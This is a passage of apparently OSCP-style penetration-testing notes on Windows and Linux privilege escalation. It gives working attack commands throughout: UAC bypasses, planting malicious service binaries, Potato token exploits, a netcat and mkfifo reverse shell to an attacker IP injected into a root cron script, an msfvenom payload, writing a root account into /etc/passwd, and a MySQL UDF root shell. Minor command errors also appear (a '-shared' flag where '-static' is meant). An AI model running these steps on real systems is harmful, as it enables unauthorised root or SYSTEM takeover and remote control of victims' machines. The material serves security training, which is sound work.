- If a network service is not remotely accessible because it is blocked by the firewall, it is generally accessible locally via the loopback interface.
- Gather information about inbound and outbound port filtering to facilitate port forwarding and tunneling when it's time to pivot to an internal network.

- Windows: 
    ```cmd
    C:\Users\student>netsh advfirewall show currentprofile                  REM Listing the current profile for the firewall 
    C:\Users\student>netsh advfirewall firewall show rule name=all          REM Listing the firewall rules
    ```
- Linux: 
  - must have root privileges to list firewall rules with **`iptables`**. 
  - the **`iptables-persistent`** package on Debian Linux saves firewall rules in specific files under the **`/etc/iptables`** directory by default. These files are used by the system to restore `netfilter` rules at boot time. 
    - These files are often left with weak permissions, allowing them to be read by any local user on the target system.
  - Search for files created by the **`iptables-save`** command, which is used to dump the firewall configuration to a file specified by the user. This file is then usually used as input for the iptables-restore command and used to restore the firewall rules at boot time. If a system administrator had ever run this command, we could search the configuration directory (**`/etc`**) or grep the file system for iptables commands to locate the file. 
  
#### Enumerating Scheduled Tasks
- Windows: 
    ```cmd
    c:\Users\student>schtasks /query /fo LIST /v            REM Listing all the scheduled tasks 
    ```
- Linux: 
    ```sh
    student@debian:~$ ls -lah /etc/cron*                    # Listing all Cron jobs
    student@debian:~$ cat /etc/crontab 
    ```
- [Understand Cron Job Syntax](https://gist.github.com/A-Pisani/5d8e14ef76c05a156d8174c62b6f1d3d#understand-cron-job-syntax)
#### Enumerating Installed Applications and Patch Levels
- Windows
    ```cmd
    c:\Users\student>wmic product get name, version, vendor                             REM Listing all installed applications  
    c:\Users\student>wmic qfe get Caption, Description, HotFixID, InstalledOn           REM Listing all installed security patches
    ```
- Linux
    ```sh
    student@debian:~$ dpkg -l     # Listing all installed packages 
    ```
#### Enumerating Readable/Writable Files and Directories
- Windows
    ```cmd
    c:\Tools\privilege_escalation\SysinternalsSuite>accesschk.exe -uws "Everyone" "C:\Program Files"       REM Listing all writable files and directories in a specified target
    PS C:\Tools\privilege_escalation\SysinternalsSuite>Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
    ```
- Linux
    ```sh
    student@debian:~$ find / -writable -type d 2>/dev/null
    ```
#### Enumerating Unmounted Disks
- Windows
    ```cmd
    c:\Users\student>mountvol                     REM Listing all drives available to mount 
    ```
- Linux
    ```sh
    student@debian:~$ cat /etc/fstab 
    student@debian:~$ mount                       # Listing content of /etc/fstab and all mounted drives
    
    student@debian:~$ /bin/lsblk                  # Listing all available drives using lsblk
    ```
#### Enumerating Device Drivers and Kernel Modules
- Windows
    ```cmd
    PS C:\Users\student> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‚ÄòDisplay Name‚Äô, ‚ÄòStart Mode‚Äô, Path                REM Listing loaded drivers
    PS C:\Users\student> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}                REM Listing driver versions
    ```
- Linux
    ```sh
    student@debian:~$ lsmod                           # Listing loaded drivers
    student@debian:~$ /sbin/modinfo <module>          # Listing additional information about a module 
    ```
#### Enumerating Binaries That AutoElevate
- Windows systems: Check the status of the `AlwaysInstallElevated` registry setting. If this key is enabled (set to `1`) any user can run Windows Installer packages with elevated privileges.
    ```cmd
    c:\Users\student>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

    c:\Users\student>reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
    ```
- Linux: Searching for SUID files
    ```sh
    student@debian:~$ find / -perm -u=s -type f 2>/dev/null                                     # Searching for SUID files
    student@debian:~$ find / -type f -a \(-perm -u+s -o -perm -g+s \) -exec ls -l {} \;         # Searching for SUID and GUID files
    ```
### Automated Enumeration

#### Linux
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration).
  - Can be used on compromised systems not having Python being a bash script.
  - Can be run in non interactive mode (`-i`) if we compromised the shell using an exploit. We can specify a verbosity output level (`-l 0,1,2`)
    ```sh
    student@debian:~$ ./lse.sh [-l LEVEL -i]
    ```
- [LinEnum](https://github.com/rebootuser/LinEnum).
  - It can copy interesting files for export, and search for files containing a keyword (`-k password`).
    ```sh
    student@debian:~$ ./LinEnum.sh -k password -export
    ```
- [unix_privesc_check](https://pentestmonkey.net/tools/audit/unix-privesc-check).
    ```sh
    student@debian:~$ ./unix-privesc-check standard > output.txt
    ```
- [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker).
- [BeRoot](https://github.com/AlessandroZ/BeRoot/tree/master/Linux).
## Windows Privilege Escalation Examples
### Understanding Windows Privileges and Integrity Levels
Privileges on Windows operating systems refer to the permissions of a specific account to perform system-related local operations.

In order for these privileges to be effective, the Windows operating system uses objects called [*access*\ *tokens*](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens). Once a user is authenticated, Windows generates an access token that is assigned to that user. The token itself contains various pieces of information that effectively describe the security context of a given user, including the user privileges.

Finally, these tokens need to be uniquely identifiable given the information they contain. This is accomplished using a [*security identifier* or *SID*](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-identifiers), which is a unique value that is assigned to each object (including tokens), such as a user or group account.

These SIDs are generated and maintained by the [Windows Local Security Authority](https://docs.microsoft.com/en-us/windows/win32/secauthn/lsa-authentication).

Windows also implements what is known as an integrity mechanism. This is a core component of the Windows security architecture and works by assigning integrity levels to application processes and securable objects.
From Windows Vista onward, processes run on four integrity levels:
1. System integrity process: SYSTEM rights
2. High integrity process: administrative rights
3. Medium integrity process: standard user rights
4. Low integrity process: very restricted rights often used in sandboxed processes

### Introduction to User Account Control (UAC)
- [*User Account Control (UAC)*](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview) is an access control system introduced by Microsoft with Windows Vista and Windows Server 2008.
- In general, the effect of UAC is that any application that wishes to perform an operation with a potential system-wide impact, cannot do so silently. At least in theory.
- It is also important to highlight the fact that UAC has two different modes: credential prompt and consent prompt.
- Even while logged in as an administrative user, the account will have two security tokens, one running at a medium integrity level and the other at high integrity level. UAC acts as the separation mechanism between those two integrity levels.

Checking the Group Integrity Level:
```cmd
c:\Users\admin>whoami /groups
...
Mandatory Label\Medium Mandatory Level  Label            S-1-16-8192
```
Using powershell to spawn a cmd.exe process with high integrity:
```cmd
C:\Users\admin>powershell.exe Start-Process cmd.exe -Verb runAs
```
Checking the Group Integrity Level:
```cmd
c:\Users\admin>whoami /groups
...
Mandatory Label\High Mandatory Level    Label            S-1-16-12288
```
### User Account Control (UAC) Bypass: fodhelper.exe Case Study
This technique allows an administrator user to bypass UAC by silently elevating our integrity level from medium to high.

The [**fodhelper.exe**](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/) binary runs as high integrity on Windows 10 1709 (**C:\Windows\System32\fodhelper.exe**). We can leverage this to bypass UAC because of the way fodhelper interacts with the Windows Registry. More specifically, it interacts with registry keys that can be modified without administrative privileges. We will attempt to find and modify these registry keys in order to run a command of our choosing with high integrity.

#### TL;DR
1. Add a Registry with the path to the executable to run.
    ```cmd
    C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
    The operation completed successfully.
    ```
2. Run `fodhelper.exe`
    ```cmd
    C:\Users\admin> C:\Windows\System32\fodhelper.exe
    ```
3. The result of this is that the executable set at point 1 will be executed. When you are working on a Windows reverse shell you may want to use an executable generated using msfvenom to open a new high integrity reverse shell.
    ```sh
    kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=<Port> -f exe -o launcher.exe
    ```

**Note**: If you can't happen to find `fodhelper.exe` in `C:\Windows\System32\` then you may want to verify that the current reverse shell integrity process level running as x64 reverse shell process instead of a x86 process:
```powershell
PS C:\Windows\Tasks> [Environment]::Is64Bit
True
```
#### Invoke-FodHelperBypass.ps1
You can use [Invoke-FodHelperBypass.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-FodHelperBypass.ps1) from PowerShell Emprie to automate the process.
- Bypasses UAC by performing a registry modification for FodHelper (based on https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/) 
- We can run **Invoke-FodHelperBypass.ps1** with the **-Command** option to specify the base64 encoded command to run in a high-integrity context.
```cmd
Invoke-FodHelperBypass -Command "IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA="          REM will write out "Is Elevated: True" to C:\UACBypassTest.
```
### [EventViewer-UACBypass](https://github.com/CsEnox/EventViewer-UACBypass) 
```cmd
PS C:\Windows\Tasks> Import-Module .\Invoke-EventViewer.ps1

PS C:\Windows\Tasks> Invoke-EventViewer "C:\Windows\Tasks\nc.exe -nv 192.168.119.227 83 -e cmd.exe"
PS C:\Windows\Tasks> Invoke-EventViewer C:\Windows\Tasks\rev_x64.exe
[+] Running
[1] Crafting Payload
[2] Writing Payload
[+] EventViewer Folder exists
[3] Finally, invoking eventvwr
```
**IMPORTANT**: 
- Use the full path of the executable you want to run (msf reverse shell or nc).
- Wrap command like nc one in double quotes.
### Insecure File Permissions: Serviio Case Study
A common way to elevate privileges on a Windows system is to exploit insecure file permissions on services that run as *nt authority\system*.

Listing running services on Windows using PowerShell:
```cmd
PS C:\Users\student> Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

Services installed in the Program Files directory are user-installed and the software developer is in charge of the directory structure as well as permissions of the software.

Enumerate the permissions on the target service with the [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) Windows utility:
```cmd
C:\Users\student> icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
```

- In order to exploit this type of vulnerability, we can replace the service with our own malicious binary and then trigger it by restarting the service or rebooting the machine.

- [useradd.c](#file-useradd-c) will create a user named "evil" and add that user to the local Administrators group using the [system](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-170&viewFallbackFrom=vs-2019) function. The compiled version of this code will serve as our malicious binary.

Compiling the `useradd.c` code:
```cmd
kali@kali:~$i686-w64-mingw32-gcc useradd.c -o useradd.exe
```

Replacing the `ServiioService.exe` binary with our malicious file:
```cmd
C:\Users\student> move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"

C:\Users\student> move useradd.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
```

Attempting to restart the service and reboot the machine:
```cmd
C:\Users\student> net stop Serviio
```
If we do not have permission to manually restart the service, we must consider another approach. If the service is set to "Automatic", we may be able to restart the service by rebooting the machine.

Showing the StartMode of the vulnerable service:
```cmd
C:\Users\student>wmic service where caption="Serviio" get name, caption, state, startmode
```

Checking for reboot privileges:
```cmd
C:\Users\student>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

The user has been granted shutdown privileges ([`SeShutdownPrivilege`](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)) - we should be able to initiate a system shutdown or reboot. 

**Note**: the Disabled state only indicates if the privilege is currently enabled for the running process. In our case, it means that whoami has not requested, and hence is not currently using, the SeShutdownPrivilege privilege.

Rebooting the machine:
```cmd
C:\Users\student\Desktop> shutdown /r /t 0          REM reboot (/r) in zero seconds (/t 0)
```

After reboot we can check that the "evil" user is a member of the Administrators group:
```cmd
C:\Users\evil> net localgroup Administrators
...
Members
-------------------------------------------------------------------------------
...
evil
```

#### Insecure File Permissions: Hide.Me VPN Client Case Study
There may be cases in which the service executable is running at startup and can't be stopped by a non-privileged user like in the [Hide.Me VPN Client 1.2.4 - Local Privilege Escalation](https://www.exploit-db.com/exploits/40071) case. 
1. As we can write to the directory we can rename all of the DLL's to DLL.old. 
2. Once renamed, reboot the machine, log on as normal user.
3. Observe both application AND the system service have crashed. Now you can replace the service .exe with a malicious copy.
4. (Place back all original DLLS and) reboot.

### Leveraging Unquoted Service Paths
- Each Windows service maps to an executable file that will be run when the service is started. 
- Most of the time, services that accompany third party software are stored under the **`C:\Program Files`** directory, which contains a space character in its name. 

Example of how Windows will try to locate the correct path of an unquoted service:
```cmd
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```
In order to exploit this and subvert the original unquoted service call, we must:
1. Create a malicious executable, place it in a directory that corresponds to one of the interpreted paths, and name it so that it also matches the interpreted filename.
2. When the service runs, it should execute our file with the same privileges that the service starts as. Often, this happens to be the `NT\SYSTEM` account, which results in a successful privilege escalation attack.
It is more likely that the software's main directory (**`C:\Program Files\My Program`** in our example) or subdirectory (**`C:\Program Files\My Program\My service`**) is misconfigured, allowing us to plant a malicious **`My.exe`** binary.

#### Exploit
1. Run winPEAS to check for service misconfigurations:
    ```
    > .\winPEASany.exe quiet servicesinfo
    ```
2. Note that the "IperiusRemotesvc" service has an unquoted path that also contains spaces: `C:\Program Files\Iperius\Iperius Remote\IperiusRemote.exe`
3. Confirm this using sc:
    ```
    > sc qc IperiusRemotesvc
    ```
4. Use accesschk.exe to check for write permissions:
    ```
    > .\accesschk.exe /accepteula -uwdq C:\
    > .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
    > .\accesschk.exe /accepteula -uwdq "C:\Program Files\Iperius\"
    ```
5. Copy the reverse shell executable and rename it appropriately:
    ```
    > copy C:\PrivEsc\reverse.exe "C:\Program Files\Iperius\Iperius.exe"
    ```
6. Start a listener on Kali, and then start the service (either directly or rebooting) to trigger the exploit:
    ```
    > net start unquotedsvc
    > shutdown /r /t 0
    ```
7. Login again as an unprivileged user

### Windows Kernel Vulnerabilities: USBPcap Case Study
When attempting to exploit system-level software (such as drivers or the kernel itself), we must pay careful attention to several factors including the target's operating system, version, and architecture. Failure to accurately identify these factors can trigger a Blue Screen of Death (BSOD) while running the exploit.

Checking the version and architecture of our target:
```cmd
C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows 7 Professional
OS Version:                6.1.7601 Service Pack 1 Build 7601
System Type:               X86-based PC
```
Listing all installed drivers
```cmd
C:\Users\student\Desktop>driverquery /v
```
Look for third-party drivers and even if they are stopped note that we may still be able to interact with them.

searchsploit output for "USBPcap" search
```sh
kali@kali:~# searchsploit USBPcap
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
USBPcap 1.1.0.0 (WireShark 2.2.5) - Lo | exploits/windows/local/41542.c
--------------------------------------- ----------------------------------------
```
It depends on a particular version of the driver, namely USBPcap version 1.1.0.0, which is installed along with Wireshark 2.2.5.

- There is a USBPcap directory in **`C:\Program Files`**. However, keep in mind that the driver directory is often found under **`C:\Windows\System32\DRIVERS`**.
- Inspect the contents of **`USBPcap\USBPcap.inf`**
- Since our Windows client has **`Mingw-w64`** pre-installed, we can run the **`mingw-w64.bat`** script that sets up the `PATH` environment variable for the gcc executable. Once the script is finished, we can execute **`gcc.exe`** to confirm that everything is working properly:
```cmd
C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1> mingw-w64.bat

C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1>echo off
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\> gcc 41542.c -o exploit.exe
```
### Token Impersonation - Service Accounts
Service Accounts can be given special privileges in order for them to run their services, and cannot be logged into directly.

Unfortunately multiple problems have been found with service accounts, making them easier to escalate privileges with.

- Use Sweet Potato to rule them all - [Sweet Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#sweetPotato)

If you do not want to use Sweet Potato:
- If the machine is >= Windows 10 1809 & Windows Server 2019 - Try [Rogue Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#roguePotato)
- If the machine is < Windows 10 1809 & Windows Server 2019 - Try [Juicy Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato)

#### [Juicy Potato](https://github.com/ohpe/juicy-potato)
- Service accounts (eg. IIS and MSSQL) can be given special privileges in order for them to run their services, and cannot be logged into directly.
- Service accounts can intercept a SYSTEM ticket and use it to impersonate SYSTEM user.
    ```cmd
    C:\Users\student>whoami /priv
    ...
    Privilege Name                Description                               State
    ============================= ========================================= ========
    SeAssignPrimaryTokenPrivilege Replace a Process level token             Disabled
    SeImpersonatePrivilege        Impersonate a client after authentication Enabled
    ...
    ```
1. Copy the [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe) (or [Juicy-Potato-x86.exe](https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe) exploit executable over to Windows.
2. Start a listener on Kali.
3. Now run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges:
    ```cmd
    C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
    ```
4. If the CLSID (`{03ca..}`) doesn't work, either check [Windows CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID#windows-clsid) (CLSID column, NT AUTHORITY\SYSTEM User) or run the [GetCLSID.ps1](http://ohpe.it/juicy-potato/CLSID/GetCLSID.ps1) pwershell script.

#### Rogue Potato
1. Copy the [RoguePotato.exe](https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip) exploit executable over to Windows.
2. Setup a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows. Replace `VICTIM_IP`:
    ```sh
    socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
    ```
3. Start a listener on Kali.
4. Now run the RoguePotato exploit to trigger a reverse shell running with SYSTEM privileges:
    ```cmd
    C:\PrivEsc\RoguePotato.exe -r YOUR_IP -e C:\PrivEsc\reverse.exe -l 9999
    ```
#### Sweet Potato
Reference: [Potatoes - Windows Privilege Escalation](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#hotPotato)

#### PrintSpoofer
PrintSpoofer is an exploit that targets the Print Spooler service. 
- Github: https://github.com/itm4n/PrintSpoofer
- Blog: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

> From `NT AUTHORITY\SERVICE`, `NT AUTHORITY\LOCAL SERVICE`, `NT AUTHORITY\NETWORK SERVICE` to `SYSTEM` by abusing `SeImpersonatePrivilege` on Windows 10 and Server 2016/2019.

If the two above conditions are met abuse token imperonation via:
```bat
C:\TOOLS>PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19613.1000]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```

> **Note:** 
> This may only work if inside a `rlwrap` session (and only in one between CMD or PS, don't remember which). Otherwise try to run a reverse shell executable instead of cmd.
## Linux Privilege Escalation Examples
### Insecure File Permissions: Cron Case Study
- In order to leverage insecure file permissions, we must locate an executable file that not only allows us write access but also runs at an elevated privilege level.
- On a Linux system, the cron time-based job scheduler is a prime target, as system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions.

Inspecting the cron log file
```sh
student@debian:~$ grep "CRON" /var/log/cron.log
```
Inserting a reverse shell one-liner in a scheduled bash script
```sh
student@debian:/var/scripts$ echo >> user_backups.sh 
student@debian:/var/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $our_IP 1234 >/tmp/f" >> user_backups.sh
```
  
> **Note**:
> Take a look at this resource [Exploiting the cron jobs misconfigurations](https://vk9-sec.com/exploiting-the-cron-jobs-misconfigurations-privilege-escalation/).
> Use [PsPy](https://github.com/DominicBreuker/pspy) to monitor system processes and undertand how frequently a job is running.
### Insecure File Permissions
#### /etc/shadow Case Study
- Unless a centralized credential system such as Active Directory or LDAP is used, Linux passwords are generally stored in **`/etc/shadow`**, which is not readable by normal users. 
- If we are able to read `/etc/shadow`, we might be able to crack the root's user password.
    ```sh
    n00b@victim:~$ ./lse.sh -i | more         # search /shadow
    [!] sys030 Can we read /etc/shadow file?.....................................yes!
    ```
    - Extract the root user‚Äôs password hash:
        ```sh
        #Attacker@Victim
        $ head -n 1 /etc/shadow 
        root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
        ```
     - Crack the password hash using john:
        ```sh
        #Attacker@Kali
        $ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
        ```
- If we are able to modify `/etc/shadow`, we can replace the root's user password with one we know.
    ```sh
    n00b@victim:~$ ./lse.sh -i | more         # search /Writable
    [!] fst000 Writable files outside user's home ...............................yes!
    /etc/passwd
    /etc/shadow
    ```
    - Copy / save the contents of /etc/shadow so we can restore it later.
    - Generate a new SHA-512 password hash:
        ```sh
        $ mkpasswd -m sha-512 newpassword $6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/
        ```
    - Edit the /etc/shadow and replace the root user‚Äôs password hash with the one we generated.
        ```sh
        root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:99999:7:::
        ```
#### /etc/passwd Case Study
- Historically, password hashes, along with other account information, were stored in the world-readable file **`/etc/passwd`**. 
- For backwards compatibility, if a password hash is present in the second column of a `/etc/passwd` user record, it is considered valid for authentication and it takes precedence over the respective entry in `/etc/shadow` if available. 
- This means that if we can write into the `/etc/passwd` file, we can effectively set an arbitrary password for any account.

Escalating privileges by editing `/etc/passwd`:
```sh
student@debian:~$ openssl passwd evil
AK24fcSx2Il3I

student@debian:~$ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd

student@debian:~$ su root2
...
```
- The root account in `/etc/passwd` is usually configured like this:
    ```sh
    root:x:0:0:root:/root:/bin/bash
    ```
  The `x` in the second field instructs Linux to look for the password hash in the `/etc/shadow` file.
- In some versions of Linux, it is possible to simply delete the `x`, which Linux interprets as the user having no password:
    ```sh
    root::0:0:root:/root:/bin/bash
    ```
#### Backups
- Even if a machine has correct permissions on important or sensitive files, a user may have created insecure backups of these files.
- Some common places include user home directories, the `/(root)` directory, `/tmp`, and `/var/backups`.
- For example if you find a `.ssh` directory with permission to view the content then it may possibly contain the `root_key` which can be the private ssh key. To exploit this we need:
1. Check if root can ssh login (because this is uncommon): 
    ```sh
    student@debian:~$ grep PermitRootLogin /etc/ssh/sshd_config
    PermitRootLogin yes
    ```
2. Copy the private key to our local machine and login
    ```sh
    kali@kali:~$ vim root_key       #paste here the key
    kali@kali:~$ chmod 600 root_key
    kali@kali:~$ ssh -i root_key root@<IP>
    ```
### Kernel Vulnerabilities: CVE-2017-1000112 Case Study
‚ö†Ô∏è Kernel exploits may often be unstable and may be one-shot or cause a system cras. Use it as a last resource!

1. Gather information about our target by inspecting the **`/etc/issue`** file.
    ```sh
    n00b@victim:~$ cat /etc/issue
    Ubuntu 16.04.3 LTS \n \l
    ```
2. Gathering kernel and architecture information from our Linux target
    ```sh
    n00b@victim:~$ uname -r 
    4.8.0-58-generic
    n00b@victim:~$ arch 
    x86_64
    ```
3. Using searchsploit to find privilege escalation exploits for our target
    ```sh
    kali@kali:~$ searchsploit linux kernel 4.8.0 priv esc                   # provide kernel version number
    ```
    ```sh
    kali@kali:~$ searchsploit linux kernel 4.8 Ubuntu priv esc              # less specific to version but specific distribution
    ```
    ```sh
    kali@kali:~$ searchsploit linux kernel ubuntu 16.04
    ```
4. A better way to find kernel exploits is to use [linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2).
    ```sh
    kali@kali:~$ linux-exploit-suggester-2.pl -k 4.8.0
    ```
#### Compiling C/C++ Code on Linux
Compiling the exploit from the local Exploit Database archive on Linux using `gcc`
```sh
n00b@victim:~$ gcc 43418.c -o exploit
```
#### Compiling on Kali
If the victim is missing GCC compiler then the exploit needs to be compiled on Kali and shipped to the victim. In this case the easiest thing is to add the `-static` option to the gcc command:
```sh
kali@kali:~$ gcc 43418.c -o exploit -shared
```

### Privilege Escalation with SUID files

#### Find command
Gain root access:
```sh
student@debian:~$ find <fname> -exec "/bin/bash" -p \;
```
### NFS misconfigurations
NFS (Network File System) is a popular distributed file system. NFS shares are configured in the `/etc/exports` file.
Remote users can mount shares, access, create, modify files. By default, created files inherit the **remote** user‚Äôs id and group id
(as owner and group respectively), even if they don‚Äôt exist on the NFS server.
#### Root Squashing
Root Squashing is how NFS prevents an obvious privilege escalation. If the remote user is (or claims to be) `root` (uid=0), NFS will instead "squash" the user and treat them as if they are the "nobody" user, in the "nogroup" group. While this behavior is default, it can be disabled!
#### `no_root_squash`
`no_root_squash` is an NFS configuration option which turns root squashing off.
When included in a writable share configuration, a remote user who identifies as "root" can create files on the NFS share as the local root user

#### Remote Exploit
Mount that directory in Kali, and as root copy inside the mounted folder our compiled payload that will abuse the SUID permission, give to it SUID rights, and execute from the victim machine that binary (you can find here some [C SUID payloads](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/payloads-to-execute#c)).

```sh
#Attacker, as root user
gcc payload.c -o payload -static
mkdir /tmp/nfs
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/nfs
cp payload /tmp/nfs
chmod +xs /tmp/nfs/payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
#### Local Exploit
- Note that if you can create a tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports.
  - Create a local port forwarding from Kali
      ```
      ssh -L 2049:127.0.0.1:2049 megan@10.1.1.27
      ```
  - Create a remote port forwarding from the victim
      ```
      ssh -N -R <Kali_IP>:2049:127.0.0.1:2049 kali@<Kali_IP>
      ```
- The following trick is in case the file `/etc/exports` indicates an IP (not `127.0.0.1/32`). In this case you won't be able to use in any case the remote exploit and you will need to abuse [this trick](https://www.errno.fr/nfs_privesc.html).

Ref: [NFS no_root_squash/no_all_squash misconfiguration PE](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)

### Service Exploits
- Services are simply programs that run in the background, accepting input or performing regular tasks.
- If vulnerable services are running as root, exploiting them can lead to command execution as root. 
- Service exploits can be found using Searchsploit, Google, and GitHub, just like with Kernel exploits.
#### Services Running as Root
- Show all processes that are running as root:
    ```
    $ ps aux | grep "^root"
    ```
- Identify the version number of the program being executed.
  - Running the program with the `--version`/`-v` command line option often shows the version number:
      ```
      $ <program> --version
      $ <program> -v
      ```
  - On Debian-like distributions, dpkg can show installed programs and their version:
      ```
      $ dpkg -l | grep <program>
      ```
  - On systems that use rpm, the following achieves the same:
      ```
      $ rpm ‚Äìqa | grep <program>
      ```
#### MySQL Case Study
1. Enumerate the processes running as root:
    ```sh
    $ ps aux | grep "^root‚Äù

    ...
    root 6933 0.0 4.9 165472 24376 pts/0 Sl 02:13 0:02 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root ...
    ```
    Note that the mysqld process is running as root.
2. Enumerate the version of mysqld:
    ```
    $ mysqld --version
    mysqld Ver 5.1.73-1+deb6u1 for debian-linux-gnu on x86_64 ((Debian))
    ```
3. MySQL has the ability to install User Defined Functions (UDF) which run via shared objects.
4. Follow the instructions in this exploit to compile and install a UDF which executes system commands: 
    - [MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)](https://www.exploit-db.com/exploits/1518)
    - [raptor_udf2.c](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c)
5. Once the UDF is installed, run the following command in the MySQL shell:
    ```mysql
    mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
    ```
6. Drop back to our regular shell, and run /tmp/rootbash for a root shell:
    ```sh
    $ /tmp/rootbash -p 
    rootbash-4.1# id
    uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
    ```
#### Port Forwarding
In some instances, a root process may be bound to an internal port, through which it communicates.
If for some reason, an exploit cannot run locally on the target machine, the port can be forwarded using SSH to your local machine:
